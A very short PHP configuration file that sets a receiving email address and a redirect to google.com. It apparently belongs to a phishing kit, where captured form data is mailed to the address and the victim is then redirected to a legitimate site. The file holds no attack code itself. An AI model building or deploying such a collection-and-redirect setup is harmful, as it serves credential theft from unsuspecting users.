<?php 
$Receive_email="mikeenterprisesltd@gmail.com";
$redirect="https://www.google.com/";
?>